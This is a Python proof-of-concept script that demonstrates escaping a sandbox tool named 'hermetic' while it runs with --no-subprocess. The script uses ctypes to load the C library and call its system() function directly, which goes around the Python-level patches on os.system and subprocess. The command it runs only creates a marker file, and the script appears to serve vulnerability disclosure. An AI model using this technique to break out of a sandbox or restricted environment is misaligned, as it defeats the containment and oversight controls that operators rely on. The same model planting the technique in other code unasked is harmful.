# bypass_poc.py
# This script demonstrates a bypass of the hermetic sandbox.
# It should be run with:
# hermetic --no-subprocess --no-network -- python bypass_poc.py

import ctypes
import sys
import os

# The goal is to execute a command even though --no-subprocess is used.
# The sandbox works by monkey-patching Python's `os.system`, `subprocess.run`, etc.
# However, it can't patch the underlying C library functions.

# We can use ctypes to load the standard C library directly.
LIBC = None
SYSTEM_FUNC = None

print("--- Attempting Sandbox Bypass ---")

try:
    if sys.platform.startswith("linux") or sys.platform == "darwin":
        # On Linux and macOS, the C library is typically libc.so.6 or libSystem.dylib
        # ctypes.util.find_library can locate it.
        import ctypes.util
        libc_path = ctypes.util.find_library("c")
        if not libc_path:
            raise OSError("Could not find C library")
        LIBC = ctypes.CDLL(libc_path, use_errno=True)
        SYSTEM_FUNC = LIBC.system
    elif sys.platform == "win32":
        # On Windows, it's in msvcrt.dll
        LIBC = ctypes.CDLL('msvcrt', use_errno=True)
        SYSTEM_FUNC = LIBC.system
    else:
        print(f"Unsupported platform: {sys.platform}")
        sys.exit(1)

except (ImportError, AttributeError, OSError) as e:
    print(f"Could not load C library via ctypes: {e}")
    print("This might happen if --block-native is enabled.")
    sys.exit(1)


# Command to execute. This is a harmless command to demonstrate the bypass.
# It creates an empty file in the current directory.
output_file = "hermetic_bypassed.txt"
command_to_run = f"touch {output_file}"
if sys.platform == "win32":
    # 'touch' isn't standard on Windows, so we'll use a different command.
    command_to_run = f"type NUL > {output_file}"


print(f"[*] Using ctypes to call the C-level 'system' function.")
print(f"[*] Command: '{command_to_run}'")

# The sandbox has patched Python's os.system, but not the C one.
# This call bypasses the Python-level guard completely.
result = SYSTEM_FUNC(command_to_run.encode('utf-8'))


# Check if the bypass was successful
if os.path.exists(output_file):
    print("\n[+] SUCCESS: The sandbox was bypassed!")
    print(f"[+] The file '{output_file}' was created, proving code execution.")
    # os.remove(output_file) # Clean up the created file
else:
    print(f"\n[-] FAILURE: The sandbox was not bypassed.")
    print(f"[-] C-level 'system' call returned: {result}")

print("--- End of Demonstration ---")
